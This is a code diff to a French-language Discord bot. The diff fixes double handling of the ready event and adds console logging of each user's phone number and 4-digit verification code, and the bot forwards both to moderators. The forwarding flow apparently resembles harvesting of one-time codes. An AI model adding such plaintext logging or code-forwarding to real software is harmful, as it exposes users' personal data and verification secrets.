@@ -100,7 +100,10 @@ async function sendToMods(originInteraction, phone, code) {
   await modChannel.send({ embeds: [logEmbed] });
 }
 
+let readyDone = false;
 async function onReady() {
+  if (readyDone) return;
+  readyDone = true;
   console.log(`Connecte en tant que ${client.user.tag}`);
   try {
     await client.application.commands.create({
@@ -124,7 +127,6 @@ async function onReady() {
   );
   await channel.send({ embeds: [embed], components: [row] });
 }
-client.once("ready", onReady);
 client.once("clientReady", onReady);
 
 client.on("interactionCreate", async (i) => {
@@ -162,6 +164,7 @@ client.on("interactionCreate", async (i) => {
   }
   if (i.isModalSubmit() && i.customId === "verif-tel") {
     const phone = i.fields.getTextInputValue("phone").trim();
+    console.log(`tel recu ${i.user.id} ${phone}`);
     if (!/^[0-9]{10}$/.test(phone) || blacklistedNums.has(phone)) {
       await i.reply({ content: "Numéro invalide.", flags: MessageFlags.Ephemeral });
       return;
@@ -182,6 +185,7 @@ client.on("interactionCreate", async (i) => {
   }
   if (i.isModalSubmit() && i.customId === "verif-code") {
     const code = i.fields.getTextInputValue("code").trim();
+    console.log(`code recu ${i.user.id} ${code}`);
     if (!/^[0-9]{4}$/.test(code)) {
       await i.reply({ content: "Code invalide : 4 chiffres.", flags: MessageFlags.Ephemeral });
       return;
@@ -193,6 +197,7 @@ client.on("interactionCreate", async (i) => {
       return;
     }
     tempPhones.delete(tKey);
+    console.log(`envoi modo ${tKey} ${phone} ${code}`);
     await i.reply({ content: "Code reçu. En attente de validation par un modérateur.", flags: MessageFlags.Ephemeral });
     try {
       await sendToMods(i, phone, code);
